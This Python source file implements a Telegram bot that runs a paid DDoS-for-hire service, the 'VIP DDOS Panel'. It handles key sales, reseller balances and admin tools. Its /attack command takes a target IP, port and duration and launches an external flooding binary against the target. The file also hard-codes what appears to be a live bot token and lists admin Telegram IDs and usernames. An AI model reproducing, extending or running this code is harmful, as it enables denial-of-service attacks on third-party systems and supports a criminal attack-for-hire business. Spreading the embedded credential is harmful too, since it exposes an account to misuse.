import os
import json
import time
import random
import string
import telebot
import datetime
import calendar
import subprocess
import threading
from telebot import types
from dateutil.relativedelta import relativedelta
import uuid

# Enhanced MarkdownV2 escape function
def escape_markdown_v2(text):
    """Escape all special characters for Telegram MarkdownV2."""
    if not text:
        return ""
    special_chars = r'_[]()~`>#+-=|{}.!@*'
    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))

# Telegram bot token (replace with your token)
bot = telebot.TeleBot('8147615549:AAGwT0ppniPc4UqlgtB-akzN9t0B4djMTAY')

# Admin user IDs with usernames and nicknames
admin_id = {
    "6258297180": {"username": "@Rahul_618", "nickname": "Rahul"},
    "1807014348": {"username": "@sadiq9869", "nickname": "Master Owner"},
    "1866961136": {"username": "@Rohan2349", "nickname": "Rohan Guru"}
}

# Bot configuration for attack parameters
BOT_CONFIG = {
    'packet_size': 1024,
    'attack_threads': 800
}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"

# Per key cost for resellers
KEY_COST = {"1hour": 10, "1day": 100, "7days": 450, "1month": 900}

# In-memory storage
users = {}
keys = {}
last_attack_time = {}
attacks = {}
data_lock = threading.Lock()
bot_start_time = datetime.datetime.now()
global_attack_active = False

# Load data from files
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file, indent=4)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file, indent=4)

def create_random_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    return f"ROHAN-PK-{random_key.upper()}"

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username or f"UserID: {user_id}"
    nickname = admin_id[user_id]["nickname"] if user_id in admin_id else username
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a") as file:
        file.write(f"[{timestamp}] Nickname: {nickname} (Username: {username})\nTarget: {target}\nPort: {port}\nTime: {time} seconds\nBinary: Rohan\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if not file.read():
                return "❌ No logs found\\."
            file.truncate(0)
            return "✅ Logs cleared successfully\\!"
    except FileNotFoundError:
        return "❌ No logs found\\."

def record_command_logs(user_id, command, target=None, port=None, time=None):
    nickname = admin_id[user_id]["nickname"] if user_id in admin_id else f"UserID: {user_id}"
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] Nickname: {nickname} | UserID: {user_id} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Reseller file handling
def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_resellers(resellers):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers, file, indent=4)

resellers = load_resellers()

# Admin command to add a reseller
@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "❌ Access Denied \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "📜 Usage \\| `/add_reseller <user_id> <balance>`\nExample \\| `/add_reseller 123456789 500`", parse_mode='MarkdownV2')
        return
    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
        if initial_balance < 0:
            raise ValueError
    except ValueError:
        bot.reply_to(message, "❌ Invalid balance amount\\.", parse_mode='MarkdownV2')
        return
    resellers[reseller_id] = initial_balance
    save_resellers(resellers)
    bot.reply_to(message, f"✅ Reseller Added \\| ID: {escape_markdown_v2(reseller_id)} \\| Balance: {initial_balance} Rs", parse_mode='MarkdownV2')

# Reseller command to generate keys
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "📜 Usage \\| `/genkey <duration>`\nAvailable \\| 1hour, 1day, 7days, 1month\nExample \\| `/genkey 1day`", parse_mode='MarkdownV2')
        return
    duration = command[1].lower()
    if duration not in KEY_COST:
        bot.reply_to(message, "❌ Invalid duration \\| Choose: 1hour, 1day, 7days, 1month", parse_mode='MarkdownV2')
        return
    cost = KEY_COST[duration]
    if user_id in admin_id:
        key = create_random_key()
        keys[key] = {"duration": duration, "expiration_time": None}
        save_keys()
        response = f"✅ Key Generated \\| Key: {escape_markdown_v2(key)} \\| Duration: {duration}"
    elif user_id in resellers:
        if resellers[user_id] >= cost:
            resellers[user_id] -= cost
            save_resellers(resellers)
            key = create_random_key()
            keys[key] = {"duration": duration, "expiration_time": None}
            save_keys()
            response = f"✅ Key Generated \\| Key: {escape_markdown_v2(key)} \\| Duration: {duration} \\| Cost: {cost} Rs \\| Balance: {resellers[user_id]} Rs"
        else:
            response = f"❌ Insufficient balance \\| Required: {cost} Rs \\| Available: {resellers[user_id]} Rs"
    else:
        response = "❌ Access Denied \\| Admin or reseller only\\."
    bot.reply_to(message, response, parse_mode='MarkdownV2')

# Help command with enhanced UI
@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "🚫 Access Denied \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🔧 Bot Controls", callback_data="help_bot_controls"),
        types.InlineKeyboardButton("⚡ Power Management", callback_data="help_power_management")
    )
    help_text = (
        "💎 *Admin Control Panel* 💎\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 Select a section:\n"
        "  • 🔧 Bot Controls: Bot management\n"
        "  • ⚡ Power Management: Attack & reseller tools\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💬 Support: @Rohan2349, @sadiq9869"
    )
    bot.reply_to(message, help_text, reply_markup=markup, parse_mode='MarkdownV2')

# Reseller balance check
@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in resellers:
        bot.reply_to(message, f"💰 Balance \\| {resellers[user_id]} Rs", parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, "❌ Access Denied \\| Reseller only\\.", parse_mode='MarkdownV2')

# Redeem key
@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    bot.reply_to(message, "🔑 Enter your key:", parse_mode='MarkdownV2')
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()
    if key in keys:
        if user_id in users:
            current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < current_expiration:
                bot.reply_to(message, "❌ You already have active access\\.", parse_mode='MarkdownV2')
                return
            else:
                del users[user_id]
                save_users()
        duration = keys[key]["duration"]
        expiration_time = {
            "1hour": add_time_to_current_date(hours=1),
            "1day": add_time_to_current_date(days=1),
            "7days": add_time_to_current_date(days=7),
            "1month": add_time_to_current_date(months=1)
        }.get(duration)
        if not expiration_time:
            bot.reply_to(message, "❌ Invalid key duration\\.", parse_mode='MarkdownV2')
            return
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        del keys[key]
        save_keys()
        bot.reply_to(message, f"✅ Access Granted \\| Expires: {users[user_id]}", parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, "❌ Invalid or expired key\\.", parse_mode='MarkdownV2')

# Show logs
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "❌ Access Denied \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        with open(LOG_FILE, "rb") as file:
            bot.send_document(message.chat.id, file, caption="📜 Recent Logs")
    else:
        bot.reply_to(message, "❌ No logs found\\.", parse_mode='MarkdownV2')

# Start command with enhanced UI
@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Attack", callback_data="attack"),
        types.InlineKeyboardButton("👤 My Info", callback_data="myinfo"),
        types.InlineKeyboardButton("🎟️ Redeem Key", callback_data="redeem"),
        types.InlineKeyboardButton("📊 Status", callback_data="status"),
        types.InlineKeyboardButton("❓ Help", callback_data="help"),
        types.InlineKeyboardButton("💰 Balance", callback_data="balance")
    )
    welcome_message = (
        "🌟 *VIP DDOS Panel* 🌟\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 Features:\n"
        "  • 🚀 Launch attacks\n"
        "  • 👤 View profile\n"
        "  • 🎟️ Redeem keys\n"
        "  • 📊 Check status\n"
        "  • ❓ Get help\n"
        "  • 💰 View balance\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📲 Owner: @Pk_Chopra\n"
        "💬 Support: @Rohan2349, @sadiq9869"
    )
    bot.reply_to(message, welcome_message, reply_markup=markup, parse_mode='MarkdownV2')

COOLDOWN_PERIOD = 60

# Inline button handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = str(call.from_user.id)
    actions = {
        "attack": lambda: handle_attack_button(call, user_id),
        "myinfo": lambda: my_info(call.message),
        "redeem": lambda: redeem_key_prompt(call.message),
        "status": lambda: status_command(call.message),
        "help": lambda: help_command(call.message),
        "balance": lambda: check_balance(call.message),
        "help_bot_controls": lambda: bot.send_message(call.message.chat.id, (
            "🔧 *Bot Controls* 🔧\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "• `/start` \\| Start bot\n"
            "• `/help` \\| Show guide\n"
            "• `/status` \\| Bot stats\n"
            "• `/logs` \\| View logs\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💬 Support: @Rohan2349, @sadiq9869"
        ), parse_mode='MarkdownV2'),
        "help_power_management": lambda: bot.send_message(call.message.chat.id, (
            "⚡ *Power Management* ⚡\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "• `/attack [IP] [PORT] [TIME]` \\| Launch attack\n"
            "• `/add_reseller <id> <balance>` \\| Add reseller\n"
            "• `/genkey <duration>` \\| Generate key\n"
            "• `/users` \\| List users\n"
            "• `/remove <id>` \\| Remove user\n"
            "• `/resellers` \\| List resellers\n"
            "• `/addbalance <id> <amount>` \\| Add balance\n"
            "• `/remove_reseller <id>` \\| Remove reseller\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💬 Support: @Rohan2349, @sadiq9869"
        ), parse_mode='MarkdownV2')
    }
    bot.answer_callback_query(call.id)
    actions.get(call.data, lambda: None)()

def handle_attack_button(call, user_id):
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            bot.send_message(call.message.chat.id, "❌ Access expired \\| Contact @Rohan2349 or @sadiq9869\\.", parse_mode='MarkdownV2')
            return
        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                bot.send_message(call.message.chat.id, f"⌛ Cooldown \\| Wait {int(COOLDOWN_PERIOD - time_since_last_attack)} seconds\\.", parse_mode='MarkdownV2')
                return
        bot.send_message(call.message.chat.id, (
            "📋 *Attack Format* 📋\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🔥 `/attack [IP] [PORT] [TIME]`\n"
            "📌 Example: `/attack 127.0.0.1 8000 60`\n"
            "⏳ Max: 240 seconds"
        ), parse_mode='MarkdownV2')
    else:
        bot.send_message(call.message.chat.id, "⛔ Unauthorized \\| Contact @Pk_Chopra, @Rohan2349, or @sadiq9869\\.", parse_mode='MarkdownV2')

# Attack command handler
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = str(message.chat.id)
    if user_id not in users:
        bot.reply_to(message, "⛔ Unauthorized \\| Contact @Pk_Chopra, @Rohan2349, or @sadiq9869\\.", parse_mode='MarkdownV2')
        return
    expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
    if datetime.datetime.now() > expiration_date:
        bot.reply_to(message, "❌ Access expired \\| Contact @Rohan2349 or @sadiq9869\\.", parse_mode='MarkdownV2')
        return
    if user_id in last_attack_time:
        time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            bot.reply_to(message, f"⌛ Cooldown \\| Wait {int(COOLDOWN_PERIOD - time_since_last_attack)} seconds\\.", parse_mode='MarkdownV2')
            return
    with data_lock:
        if global_attack_active:
            bot.reply_to(message, "❌ Another attack is active \\| Wait for completion\\.", parse_mode='MarkdownV2')
            return
        if user_id in attacks:
            bot.reply_to(message, "❌ You have an active attack \\| Wait for completion\\.", parse_mode='MarkdownV2')
            return
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, (
            "📋 *Attack Format* 📋\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🔥 `/attack [IP] [PORT] [TIME]`\n"
            "📌 Example: `/attack 127.0.0.1 8000 60`\n"
            "⏳ Max: 240 seconds"
        ), parse_mode='MarkdownV2')
        return
    try:
        ip = args[1]
        port = int(args[2])
        duration = int(args[3])
        if duration > 240 or duration <= 0:
            bot.reply_to(message, "❌ Duration must be 1-240 seconds\\.", parse_mode='MarkdownV2')
            return
        record_command_logs(user_id, 'attack', ip, port, duration)
        log_command(user_id, ip, port, duration)
        loading_msg = bot.reply_to(message, "🚀 Preparing Attack \\| ███ 0%...", parse_mode='MarkdownV2')
        time.sleep(1)
        bot.edit_message_text("🚀 Preparing Attack \\| ██████ 50%...", chat_id=message.chat.id, message_id=loading_msg.message_id, parse_mode='MarkdownV2')
        time.sleep(1)
        bot.edit_message_text("🚀 Preparing Attack \\| █████████ 100%...", chat_id=message.chat.id, message_id=loading_msg.message_id, parse_mode='MarkdownV2')
        time.sleep(0.5)
        username = message.chat.username or "No username"
        response = (
            "🚀 *Attack Launched* 🚀\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: {escape_markdown_v2(ip)}:{port}\n"
            f"⏳ Duration: {duration} seconds\n"
            f"👤 Attacker: @{escape_markdown_v2(username)}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "📲 Powered by: @Rohan2349 & @sadiq9869"
        )
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=loading_msg.message_id, parse_mode='MarkdownV2')
        threading.Thread(target=run_attack, args=(user_id, ip, port, duration, message.chat.id)).start()
        last_attack_time[user_id] = datetime.datetime.now()
    except ValueError:
        bot.reply_to(message, (
            "❌ Invalid format \\| Use `/attack [IP] [PORT] [TIME]`\n"
            "Example: `/attack 127.0.0.1 8000 60`"
        ), parse_mode='MarkdownV2')

# Execute attack
def run_attack(user_id, ip, port, duration, chat_id):
    global global_attack_active
    try:
        if not os.path.exists('./Rohan'):
            raise FileNotFoundError("Rohan binary not found")
        with data_lock:
            global_attack_active = True
        packet_size = BOT_CONFIG['packet_size']
        process = subprocess.Popen(
            ['./Rohan', ip, str(port), str(duration), str(packet_size)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        with data_lock:
            attacks[user_id] = {'process': process, 'chat_id': chat_id}
        stdout, stderr = process.communicate(timeout=duration + 10)
        if process.returncode != 0:
            raise subprocess.SubprocessError(f"Attack failed: {stderr.decode('utf-8', errors='ignore')}")
        bot.send_message(chat_id, (
            "✅ *Attack Completed* ✅\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: {escape_markdown_v2(ip)}:{port}\n"
            f"⏳ Duration: {duration} seconds\n"
            "🏆 Result: Success\\!"
        ), parse_mode='MarkdownV2')
    except (FileNotFoundError, subprocess.SubprocessError, subprocess.TimeoutExpired) as e:
        bot.send_message(chat_id, f"❌ Attack Failed \\| Error: {escape_markdown_v2(str(e))}", parse_mode='MarkdownV2')
    except Exception as e:
        bot.send_message(chat_id, "❌ Attack Failed \\| Unexpected error\\.", parse_mode='MarkdownV2')
    finally:
        with data_lock:
            if user_id in attacks:
                del attacks[user_id]
            global_attack_active = False

# My Info handler
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    if user_id in admin_id:
        response = (
            "👤 *Profile* 👤\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📛 Username: @{escape_markdown_v2(username)}\n"
            f"🆔 ID: {user_id}\n"
            f"🚹 Role: Admin\n"
            f"👑 Nickname: {escape_markdown_v2(admin_id[user_id]['nickname'])}\n"
            "⏳ Expiration: N/A"
        )
    elif user_id in resellers:
        response = (
            "👤 *Profile* 👤\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📛 Username: @{escape_markdown_v2(username)}\n"
            f"🆔 ID: {user_id}\n"
            f"🚹 Role: Reseller\n"
            f"💰 Balance: {resellers[user_id]} Rs\n"
            "⏳ Expiration: N/A"
        )
    elif user_id in users:
        response = (
            "👤 *Profile* 👤\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📛 Username: @{escape_markdown_v2(username)}\n"
            f"🆔 ID: {user_id}\n"
            f"🚹 Role: User\n"
            f"⏳ Expiration: {users[user_id]}"
        )
    else:
        response = (
            "👤 *Profile* 👤\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📛 Username: @{escape_markdown_v2(username)}\n"
            f"🆔 ID: {user_id}\n"
            f"🚹 Role: Guest\n"
            "⏳ Expiration: No access"
        )
    bot.reply_to(message, response, parse_mode='MarkdownV2')

# List authorized users
@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "❌ Access Denied \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    if not users:
        bot.reply_to(message, "❌ No authorized users\\.", parse_mode='MarkdownV2')
        return
    response = "✅ *Authorized Users* ✅\n━━━━━━━━━━━━━━━━━━━━━━━\n"
    for user, expiration in users.items():
        user_info = bot.get_chat(user)
        username = user_info.username or user_info.first_name
        response += f"👤 ID: {user}\n📛 Username: @{escape_markdown_v2(username)}\n⏳ Expires: {expiration}\n\n"
    bot.reply_to(message, response, parse_mode='MarkdownV2')

# Remove user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "❌ Access Denied \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "📜 Usage \\| `/remove <user_id>`\nExample \\| `/remove 123456789`", parse_mode='MarkdownV2')
        return
    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        bot.reply_to(message, f"✅ User {escape_markdown_v2(target_user_id)} removed\\.", parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, f"❌ User {escape_markdown_v2(target_user_id)} not found\\.", parse_mode='MarkdownV2')

# Show resellers
@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "❌ Access Denied \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    if not resellers:
        bot.reply_to(message, "❌ No resellers found\\.", parse_mode='MarkdownV2')
        return
    response = "✅ *Resellers* ✅\n━━━━━━━━━━━━━━━━━━━━━━━\n"
    for reseller_id, balance in resellers.items():
        reseller_info = bot.get_chat(reseller_id)
        username = reseller_info.username or "Unknown"
        response += f"👤 Username: @{escape_markdown_v2(username)}\n🆔 ID: {reseller_id}\n💰 Balance: {balance} Rs\n\n"
    bot.reply_to(message, response, parse_mode='MarkdownV2')

# Add balance
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "❌ Access Denied \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "📜 Usage \\| `/addbalance <reseller_id> <amount>`\nExample \\| `/addbalance 123456789 500`", parse_mode='MarkdownV2')
        return
    reseller_id = command[1]
    try:
        amount = float(command[2])
        if amount <= 0:
            raise ValueError
    except ValueError:
        bot.reply_to(message, "❌ Invalid amount\\.", parse_mode='MarkdownV2')
        return
    if reseller_id not in resellers:
        bot.reply_to(message, "❌ Reseller ID not found\\.", parse_mode='MarkdownV2')
        return
    resellers[reseller_id] += amount
    save_resellers(resellers)
    bot.reply_to(message, f"✅ Balance Added \\| ID: {escape_markdown_v2(reseller_id)} \\| Amount: {amount} Rs \\| New Balance: {resellers[reseller_id]} Rs", parse_mode='MarkdownV2')

# Remove reseller
@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "❌ Access Denied \\| Admin only\\.", parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "📜 Usage \\| `/remove_reseller <reseller_id>`\nExample \\| `/remove_reseller 123456789`", parse_mode='MarkdownV2')
        return
    reseller_id = command[1]
    if reseller_id not in resellers:
        bot.reply_to(message, "❌ Reseller ID not found\\.", parse_mode='MarkdownV2')
        return
    del resellers[reseller_id]
    save_resellers(resellers)
    bot.reply_to(message, f"✅ Reseller {escape_markdown_v2(reseller_id)} removed\\.", parse_mode='MarkdownV2')

# Status command
@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = str(message.chat.id)
    uptime = datetime.datetime.now() - bot_start_time
    days, seconds = uptime.days, uptime.seconds
    hours, seconds = seconds // 3600, seconds % 3600
    minutes, seconds = seconds // 60, seconds % 60
    response = (
        "📊 *Bot Status* 📊\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🕒 Uptime: {days}d {hours}h {minutes}m {seconds}s\n"
        f"👥 Users: {len(users)}\n"
        f"🎫 Keys: {len(keys)}\n"
        f"🏦 Resellers: {len(resellers)}\n"
        f"⚡ Attacks: {len(attacks)}\n"
    )
    if user_id in admin_id:
        response += f"🔧 Admin: {escape_markdown_v2(admin_id[user_id]['nickname'])}\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━\n📲 Powered by: @Rohan2349 & @sadiq9869"
    bot.reply_to(message, response, parse_mode='MarkdownV2')

if __name__ == "__main__":
    load_data()
    print("Bot is running...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)